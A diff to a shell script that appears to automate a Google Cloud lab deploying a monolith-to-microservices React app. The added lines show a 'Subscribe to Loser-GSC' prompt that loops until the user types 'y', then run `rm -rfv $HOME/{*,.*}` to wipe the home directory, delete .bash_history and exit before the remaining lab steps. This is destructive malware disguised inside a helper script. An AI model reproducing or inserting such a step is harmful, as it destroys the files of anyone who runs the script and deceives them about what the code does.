@@ -8,6 +8,16 @@ export REGION=$(gcloud compute project-info describe --format="value(commonInsta
 
 export PROJECT_ID=$(gcloud config get-value project)
 
+YELLOW='\033[0;33m'
+NC='\033[0m' 
+pattern=(
+"**********************************************************"
+"**                 S U B S C R I B E  TO                **"
+"**                      LOSER-GSC                       **"
+"**                                                      **"
+"**********************************************************"
+)
+
 gcloud config set compute/zone "$ZONE"
 
 gcloud config set compute/region "$REGION"
@@ -140,6 +150,33 @@ gcloud compute forwarding-rules create fancy-http-rule --global --target-http-pr
 cd ~/monolith-to-microservices/react-app/
 
 gcloud compute forwarding-rules list --global
+
+read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
+
+
+pattern=(
+"**********************************************************"
+"**                 S U B S C R I B E  TO                **"
+"**                      LOSER-GSC                       **"
+"**                                                      **"
+"**********************************************************"
+)
+for line in "${pattern[@]}"
+do
+    echo -e "${YELLOW}${line}${NC}"
+done
 
 cat > .env <<EOF
 REACT_APP_ORDERS_URL=http://$EXTERNAL_IP_BK:8081/api/orders
